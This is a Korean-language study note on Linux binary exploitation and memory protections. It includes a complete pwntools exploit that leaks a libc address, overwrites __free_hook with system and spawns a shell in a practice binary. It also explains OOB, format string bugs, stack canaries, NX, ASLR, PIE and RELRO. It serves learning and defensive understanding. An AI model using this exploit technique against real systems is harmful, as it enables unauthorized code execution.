
- 정리하자면
  - 조건: 
    1. buffer overflow가 발생한다.
    2. 프로그램의 바이너리가 필요하다.
    3. 프로그램에서 `free` 함수를 호출하고, `free` 함수의 인자를 표준 입력으로 받는다.
    4. 프로그램에서 임의 주소에 임의 값을 덮어쓴다.
       - got 를 수정할 수 없기 때문에 ROP 와 비교했을 때 조건이 하나 더 추가된다.
    5. 프로그램에 사용된 libc 라이브러리가 필요하다.
  - 단계:
     1. 바이너리를 `gdb` 로 분석하여 `main` 함수가 `__libc_start_main` 함수의 몇 번째 라인에서 호출되는지 확인한다.
     2. 프로그램의 ELF 를 확인하여 
     3. 프로그램을 실행시키고, buffer overflow로 main 함수의 stack frame 에서 return address 값을 출력시킨다. 
     4. 출력된 주소값으로 libc_base 를 구한다.
     5. libc_base 값으로 `system`, `__free_hok` 함수와 `"/bin/sh"` 문자열의 주소를 구한다.
     6. 조건 (4) 에 해당하는 코드로 프로그램에서 `__free_hook` 함수의 주소에 `system` 함수의 주소를 대입한다. 
     7. 프로그램에서 호출된 `free` 함수의 인자에 `"/bin/sh"` 문자열의 주소를 대입한다.
- exploit 예시
```
from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

BUF_SIZE = 0x30

##########
# 1. leak memory of 'main' function
##########
payload = b'A' * (BUF_SIZE + 8 + 8 + 8) # BUFFER + canary dummy + canary + SFP
p.sendafter('Buf: ', payload)

print(p.recvuntil(payload))  # payload 값 버리기
addr_main_return = u64(p.recvn(6).ljust(8,b'\x00'))  # main 함수의 stack frame 의 return 주소

##########
# 2. calculate offsets of '__libc_start_main' function
##########
# gdb 에서 확인 한 main 함수의 __libc_start_main 에서의 offset 은 231 이다
# 0x7ffff7a03c87 <__libc_start_main+231>:      mov    edi,eax

OFFSET_MAIN = 231 
ADDR_LIBC_START_MAIN = addr_main_return - OFFSET_MAIN  # __libc_start_main 함수의 주소

# readelf -s 명령으로 확인한 __libc_start_main 의 offset 은 0x021b10 였다.
# 2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
# OFFSET_LIBC_START_MAIN = libc.symbols['__libc_start_main']
OFFSET_LIBC_START_MAIN = 0x21b10
libc_base = ADDR_LIBC_START_MAIN - OFFSET_LIBC_START_MAIN
addr_system = libc.symbols['system'] + libc_base  # libc_base 에 offset 합산
addr_free_hook = libc_base + libc.symbols['__free_hook']  # libc_base 에 offset 합산
addr_bin_sh = libc_base + next(libc.search(b'/bin/sh'))  # libc에 위치한 "/bin/sh" 문자열의 위치 추출 후 주소 계산

print('libc_base:', hex(libc_base),  '\naddr_free_hook:', hex(addr_free_hook), '\naddr_system:', hex(addr_system), '\naddr_bin_sh:', hex(addr_bin_sh))


##########
# 3. get shell
##########

# stack 에 값을 직접 채워넣을때는 p64() 함수로 패키징을 한 binary 데이터를 전달헀지만,
# 프로그램에서 정상적으로 변수에 값을 집어게 할 때는 string 형태로 변환해야 한다

input1 = str(addr_free_hook).encode()
print(p.recvuntil('To write: '))
p.sendline(input1)  # input1
input2 = str(addr_system).encode()
print(p.recvuntil('With: '))
p.sendline(input2)  # input2
# 코드상 input1(__free_hook) 의 주소를 input2(system) 의 주소로 변경시켜줌

input3 = str(addr_bin_sh).encode()
print(p.recvuntil('To free:'))
p.sendline(input3)  # __free_hook 함수는 __free_hook(arg1) 형태로 동작하므로, arg1 에 "bin/sh" 를 넣어서 system("/bin/sh") 를 만든다.

p.interactive()

```

### Out Of Bound
- C 언어에서는 배열을 참조할 때 `[]` 연산자를 사용한다. 
- 하지만 C 언어 컴파일러는 `[]` 연산자 사용시 배열의 범위를 벗어났는지 체크하지 않고, boundary check 는 오직 개발자의 몫이다.
- `[]` 연산자 사용시 boundary check 가 미흡한 코드가 있다면, boundary 를 벗어나는 index 를 넣어 코드의 특정 메모리를 참조할 수 있고, 이러한 공격을 `OOB`(out of bound) 라 한다.
- 예를 들어, 아래 코드를 실행한다고 하자.
  ```
  char* secret = "SECRET KEY";
  char[] arr = {"name", "age", "phone", "address"};
  int idx;

  scanf("%d", &idx);
  printf("%s", arr[idx]);
  ```
  - 변수 `idx` 에 대한 boundary check 가 되어있지 않아 idx 값을 원하는 대로 넣어 같은 주변의 메모리를 참조할 수 있게 된다. 
  - 실행 될 때 stack 을 예로 들면 아래와 같은 형태가 될 것이다.
    ```
    01:0008│-038 0x7fffffffdec8 —▸ 0x555555558040 (secret) ◂— 'SECRET KEY\n'
    02:0010│-030 0x7fffffffded0 —▸ 0x55555555602d ◂— 'name'
    03:0018│-028 0x7fffffffded8 —▸ 0x555555556041 ◂— 'age'
    04:0020│-020 0x7fffffffdee0 —▸ 0x55555555604d ◂— 'phone'
    05:0028│-018 0x7fffffffdee8 —▸ 0x55555555605b ◂— 'address'
    ```
  - `arr[0]` 은 `0x7fffffffded0` 주소에 해당하고, `arr[-1]`은 `0x555555558040` 주소에 해당하는 값을 반환 한다. 
  - idx 에 -1 을 넣으면 개발자가 의도하지 않은 변수 값인 `secret` 변수의 값 "SECRET KEY" 문자열이 출력되게 할 수 있다. 

### FBS (Format String Bug)
- C 언어에서 문자열을 처리하는 함수 중 f로 끝나는 함수들은 대부분 `format string` 을 처리하는 함수이다. 
- `format string` 이란, %d %s %u 처럼 문자열에 변수를 특정 형식으로 매핑 해 놓은 형태를 의미한다.
- `format string` 을 처리하는 함수는 `format string` 이 필요로 하는 변수의 갯수를 확인하는 과정이 별도로 없어, 해커들이 이를 이용해 의도하지 않은 변수들을 추가로 출력/입력 하도록 조작할 여지를 만든다.

## 보호 기법
- 앞서 살펴본 취약점을 방어하기 위한 기법들을 소개한다.

### Stack Canary
- 광부들이 탄광에 들어갈 때 카나리아 새를 데리고 들어간다. 카나리아는 인간보다 가스에 민감하여, 유독가스로 인해 위험한 상황이 발생 할 경우 카나리아가 먼저 이를 인지하고 이상 행동을 보이게 된다. 광부들은 카나리아의 행동을 관찰하며 위험한 환경에서 빨리 탈출할 수 있다. 
- 탄광의 카나리아 새를 따서 Stack의 overflow를 감지하는 기능도 Stack Canary 라 이름 짓는다.
- 우분투에서 C 파일을 컴파일 할 때 기본적으로 Stack Canary를 적용하며, `-fno-stack-protector` 옵션을 넣어 gcc 컴파일을 하면 Stack Canary 설정을 끌 수 있다.
- Stack이 오염되면 대부분은 `Segmentation Fault` 오류를 발생하며 종료된다. 
- Stack Canary가 설정되어 있으면 `stack smashing detected` 오류가 대신 발생한다. 이는 Stack의 오염이 감지되어 강제로 프로그램이 종료됨을 의미한다.
- Stack Canary의 동작을 어셈블리어로 표현하면 다음과 같다.
    ```
    	mov    rax,QWORD PTR fs:0x28    # fs 레지스터의 0x28값을 rax에 대입
      mov    QWORD PTR [rbp-0x8],rax  # 스택 카나리를 rbp-8에 저장
      call   FUNCTION                 # 함수 호출

      ...

      mov    rcx,QWORD PTR [rbp-0x8]  # rbp-8에서 스택 카나리 추출
      xor    rcx,QWORD PTR fs:0x28    # fs:0x28과 스택 카나리 비교
      je     0x6f0 <main+94>          # 값이 같으면 다르면 호출부로 이동
      call   __stack_chk_fail@plt     # 값이 다르면 에러 출력

    ```
    - fs는 세그먼트 레지스터의 일종으로, 리눅스는 부팅시 fs:0x28 위치에 랜덤 생성하여 저장한다.
- X64 아키텍처는 8바이트, X86 아키텍처는 4바이트 카나리를 사용한다.
- stack에 적용될 때 x64 아키텍처는 8바이트, x86 아키텍처는 4바이트 더미값 이후 canary가 들어감에 주의한다.
  - [stack참조](../../assembly/assembly_basic/#스택프레임)
- 카나리는 NULL 값으로 시작한다.
- 카나리는 TLS에 전역변수로 저장되고, 각 함수들이 이를 공용으로 참조한다.

### NX
- No eXecute의 약자로, 실행에 사용되는 메모리 영역과 writing에 사용되는 메모리 영역을 분리하여 악의적으로 buffer에 코드를 심어 실행시키는 행위를 방지하는 기법이다.
- NX 기법은 CPU가 지원해야 동작할 수 있다.
- NX가 적용된 바이너리를 gdb로 디버깅 하여 `vmmap` 명령으로 각 주소의 권한을 살펴보면 `Perm` 영역이 'rw'와 'x' 가 분리된 것이 확인된다.
- 실행 권한이 없는 주소를 실행시키려 하면 segment fault 가 발생하며 코드가 종료되게 된다.
- NX기법은 XD(eXecution Disable), DEP(Data Execution Prevention), XN(eXecute Never) 등으로 불리기도 한다.

### ASLR
- Address Space Layout Randomization 의 약자로 바이너리가 실행 될 때 마다 매번 다른 주소값에 메모리 세그먼트들을 할당하여 주소의 유출을 방지하는 기법이다.
- 커널에서 ASLR을 지원해야 동작이 가능하다.
- 리눅스에서 `cat /proc/sys/kernel/randomize_va_space` 명령으로 해당 커널이 ASLR을 지원하는지 확인 가능하다.
  - 0 : ASLR 미지원
  - 1 : stack, heap, library, vdso 등의 주소를 랜덤화
  - 2 : (1) 에 더해 brk 영역도 랜덤화
- 리눅스는 ASLR이 적용됐을 때, 페이지(page) 단위로 파일을 매핑하기 때문에 주소값 64비트 중 상위 52비트의 주소는 바뀌어도 하위 12비트는 변경되지 않는다.
  - 0x1111111111111222 : 1은 변경될 수 있고, 2는 고정
  - 예를들어 라이브러리의 printf의 함수의 주소가 0x12345678이라면, 다음번 실행시에도 마지막 12비트는 678임이 보장된다.
- main 함수의 주소는 여러번 실행해도 변경되지 않는다.

### PIE
- Position Independent Executable 의 약자이다.
- ASLR이 런타임에 생성되는 stack, heap, library 영역의 메모리를 랜덤 매핑하는 기법이었다면, PIE는 code 영역의 메모리를 랜덤하게 매핑하는 보호 기법이다.

- 리눅스의 ELF는 Executable(실행파일) 파일과 Shared Object(공유파일) 로 양분되는데 Shared Object 는 메모리 상에 어디에 올려놓아도 동작 가능하도록 설계되어 있다. 
- 메모리 위치에 제약을 받지 않는 이러한 성질을 가진 코드를 `Position-Independent Code` 줄여서 `PIC` 라 부른다.

- Shared Object 들은 최초 설계 시에 PIC 속성을 갖도록 설계되었고, Executable 파일들은 그렇지 않았다. 실행 파일들도 PIC 속성을 갖게 하려고 Shared Object 형태로 구성하였고, 이를 `PIE`(Position-Independent Executable) 라 명명하였다.
- PIE로 구성된 코드들은 ASLR 이 적용되면 다른 Shared Object 와 마찬가지로 랜덤한 주소에 배치받게 된다. 
- ASLR에 의해 PIE 코드가 랜덤한 메모리에 적재되면 그 시작 주소를 `base code`, 혹은 `PIE base` 라 칭한다.

### RELRO (RELocation Read-Only)
- 데이터 세그먼트에서 불필요한 쓰기 권한을 제거하여 공격을 방지하는 방법
- Partial RELRO 와 Full RELRO 두 가지 방법이 있다.
  - gcc 컴파일 시 `-no-pie -fno-pie` 옵션을 넣어서 pie를 제거하면 partial RELRO 로 동작한다.
  - `-no-pie`는 코드 생성 옵션이고, `-fno-pie`는 링킹 과정의 옵션으로 둘 다 설정해야 PIE 없이 바이너리가 생성된다.
  - 위 두 옵션 없이 gcc 컴파일을 수행하면 Full RELRO가 적용된다.
- Partial RELRO 가 적용된 파일을 `objdump -h` 명령어로 확인하면 section에 `.got`와 `.got.plt` 가 확인된다.
  - `.got` section에는 실행되기 전에 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 없다.
  - `.got.plt` section에는 실행되는 도중 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 부여된다. 
  - `.got.plt` 영역을 덮어쓰는 `GOT overwrite` 공격에 취약하다.
- Full RELRO 가 적용되면 함수들의 주소가 바이너리 로딩 시점에 모두 바인딩 되므로 .got 영역에는 쓰기 권한이 부여되지 않는다.
  - 동적 메모리 할당/해제시 동작하는 `hook` 을 이용한 공격인 `Hook Overwrite` 에 취약하다.

#### segment 권한 확인 방법
1. 특정 프로세스에서 `/proc/self/maps` 경로의 파일을 출력하도록 코드를 작성한다.
2. 작성한 코드를 컴파일 하고, 실행 파일을 생성한다.
3. 실행 파일을 실행하여 `/proc/self/maps` 파일 내용을 확인한다.
  - 내용 중 `파일명` 에 해당하는 부분이 메모리 시작주소이다. 
  - ex) `objdump -h /usr/bin/cat` 결과이다. `/usr/bin/cat` 의 메모리 시작주소는 0x561210c55000 가 된다.
    ```
    561210c55000-561210c57000 r--p 00000000 08:20 1773                       /usr/bin/cat
    561210c57000-561210c5c000 r-xp 00002000 08:20 1773                       /usr/bin/cat
    561210c5c000-561210c5f000 r--p 00007000 08:20 1773                       /usr/bin/cat
    561210c5f000-561210c60000 r--p 00009000 08:20 1773                       /usr/bin/cat
    561210c60000-561210c61000 rw-p 0000a000 08:20 1773                       /usr/bin/cat
    5612123c3000-5612123e4000 rw-p 00000000 00:00 0                          [heap]
    7f84ddb0a000-7f84ddb2c000 rw-p 00000000 00:00 0
    7f84ddb2c000-7f84ddb5e000 r--p 00000000 08:20 25559                      /usr/lib/locale/C.UTF-8/LC_CTYPE
    7f84ddb5e000-7f84ddb5f000 r--p 00000000 08:20 25620                      /usr/lib/locale/C.UTF-8/LC_NUMERIC
    7f84ddb5f000-7f84ddb60000 r--p 00000000 08:20 26418                      /usr/lib/locale/C.UTF-8/LC_TIME
    7f84ddb60000-7f84ddcd3000 r--p 00000000 08:20 25554                      /usr/lib/locale/C.UTF-8/LC_COLLATE
    7f84ddcd3000-7f84ddcd4000 r--p 00000000 08:20 25593                      /usr/lib/locale/C.UTF-8/LC_MONETARY
    7f84ddcd4000-7f84ddcd5000 r--p 00000000 08:20 25575                      /usr/lib/locale/C.UTF-8/LC_MESSAGES/SYS_LC_MESSAGES
    7f84ddcd5000-7f84ddcd6000 r--p 00000000 08:20 26123                      /usr/lib/locale/C.UTF-8/LC_PAPER
    7f84ddcd6000-7f84ddcd7000 r--p 00000000 08:20 25601                      /usr/lib/locale/C.UTF-8/LC_NAME
    7f84ddcd7000-7f84ddfbd000 r--p 00000000 08:20 15009                      /usr/lib/locale/locale-archive
    7f84ddfbd000-7f84ddfdf000 r--p 00000000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    7f84ddfdf000-7f84de157000 r-xp 00022000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    7f84de157000-7f84de1a5000 r--p 0019a000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    7f84de1a5000-7f84de1a9000 r--p 001e7000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    7f84de1a9000-7f84de1ab000 rw-p 001eb000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
    7f84de1ab000-7f84de1b1000 rw-p 00000000 00:00 0
    7f84de1b1000-7f84de1b2000 r--p 00000000 08:20 25549                      /usr/lib/locale/C.UTF-8/LC_ADDRESS
    7f84de1b2000-7f84de1b3000 r--p 00000000 08:20 26189                      /usr/lib/locale/C.UTF-8/LC_TELEPHONE
    7f84de1b3000-7f84de1b4000 r--p 00000000 08:20 25574                      /usr/lib/locale/C.UTF-8/LC_MEASUREMENT
    7f84de1b4000-7f84de1bb000 r--s 00000000 08:20 42694                      /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
    7f84de1bb000-7f84de1bc000 r--p 00000000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    7f84de1bc000-7f84de1df000 r-xp 00001000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    7f84de1df000-7f84de1e7000 r--p 00024000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    7f84de1e7000-7f84de1e8000 r--p 00000000 08:20 25569                      /usr/lib/locale/C.UTF-8/LC_IDENTIFICATION
    7f84de1e8000-7f84de1e9000 r--p 0002c000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    7f84de1e9000-7f84de1ea000 rw-p 0002d000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
    7f84de1ea000-7f84de1eb000 rw-p 00000000 00:00 0
    7ffcf0c34000-7ffcf0c55000 rw-p 00000000 00:00 0                          [stack]
    7ffcf0d14000-7ffcf0d18000 r--p 00000000 00:00 0                          [vvar]
    7ffcf0d18000-7ffcf0d1a000 r-xp 00000000 00:00 0                          [vdso]
    ```
4. 생성한 실행파일을 `objdump -h` 명령어를 사용해 section header를 확인한다.
  - section header의 VMA에 해당하는 부분이 메모리의 offset이다. (3)에서 찾은 메모리 시작주소에 offset을 더하면 실제 메모리 주소를 확인할 수 있다.
  - ex) `.plt` 의 메모리 주소는 0x561210c55000 + 0x0000000000002020 = `0x561210C57020` 가 된다.
    ```
    /usr/bin/cat:     file format elf64-x86-64

    Sections:
    Idx Name          Size      VMA               LMA               File off  Algn
    0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    4 .gnu.hash     0000006c  00000000000003a0  00000000000003a0  000003a0  2**3
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    5 .dynsym       00000690  0000000000000410  0000000000000410  00000410  2**3
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    6 .dynstr       0000033d  0000000000000aa0  0000000000000aa0  00000aa0  2**0
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    7 .gnu.version  0000008c  0000000000000dde  0000000000000dde  00000dde  2**1
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    8 .gnu.version_r 00000060  0000000000000e70  0000000000000e70  00000e70  2**3
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    9 .rela.dyn     00000378  0000000000000ed0  0000000000000ed0  00000ed0  2**3
                    CONTENTS, ALLOC, LOAD, READONLY, DATA
    10 .rela.plt     00000498  0000000000001248  0000000000001248  00001248  2**3
                      CONTENTS, ALLOC, LOAD, READONLY, DATA
    11 .init         0000001b  0000000000002000  0000000000002000  00002000  2**2
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    12 .plt          00000320  0000000000002020  0000000000002020  00002020  2**4
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    13 .plt.got      00000010  0000000000002340  0000000000002340  00002340  2**4
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    14 .plt.sec      00000310  0000000000002350  0000000000002350  00002350  2**4
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    15 .text         00003dc2  0000000000002660  0000000000002660  00002660  2**4
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    16 .fini         0000000d  0000000000006424  0000000000006424  00006424  2**2
                      CONTENTS, ALLOC, LOAD, READONLY, CODE
    17 .rodata       0000122c  0000000000007000  0000000000007000  00007000  2**5
                      CONTENTS, ALLOC, LOAD, READONLY, DATA
    18 .eh_frame_hdr 000002bc  000000000000822c  000000000000822c  0000822c  2**2
                      CONTENTS, ALLOC, LOAD, READONLY, DATA
    19 .eh_frame     00000ce8  00000000000084e8  00000000000084e8  000084e8  2**3
                      CONTENTS, ALLOC, LOAD, READONLY, DATA
    20 .init_array   00000008  000000000000aa90  000000000000aa90  00009a90  2**3
                      CONTENTS, ALLOC, LOAD, DATA
    21 .fini_array   00000008  000000000000aa98  000000000000aa98  00009a98  2**3
                      CONTENTS, ALLOC, LOAD, DATA
    22 .data.rel.ro  00000198  000000000000aaa0  000000000000aaa0  00009aa0  2**5
                      CONTENTS, ALLOC, LOAD, DATA
    23 .dynamic      000001f0  000000000000ac38  000000000000ac38  00009c38  2**3
                      CONTENTS, ALLOC, LOAD, DATA
    24 .got          000001c8  000000000000ae28  000000000000ae28  00009e28  2**3
                      CONTENTS, ALLOC, LOAD, DATA
    25 .data         000000c0  000000000000b000  000000000000b000  0000a000  2**5
                      CONTENTS, ALLOC, LOAD, DATA
    26 .bss          00000198  000000000000b0c0  000000000000b0c0  0000a0c0  2**5
                      ALLOC
    27 .gnu_debuglink 00000034  0000000000000000  0000000000000000  0000a0c0  2**2
                      CONTENTS, READONLY
    ```
5. (4)에서 확인한 메모리 주소가 (3)에서 출력한 메모리 주소별 권한을 대조하여, 해당 영역의 권한을 확인할 수 있다.
  - .plt 영역인 `0x561210C57020` 는 
  `561210c57000-561210c5c000 r-xp 00002000 08:20 1773                       /usr/bin/cat` 라인에 해당하며, 읽기/실행 권한이 있고, 쓰기 권한은 부여되지 않은 것이 확인된다. 
  - RELRO가 적용되어 `.fini_array` 와 `.init_array` 영역은 쓰기 권한이 없는 것이 확인된다.
  - checksec 명령으로 확인 결과 Full RELRO가 적용된 것이 확인된다.
    ```
    checksec /usr/bin/cat
    [*] '/usr/bin/cat'
      Arch:     amd64-64-little
      RELRO:    Full RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled
      FORTIFY:  Enabled
    ```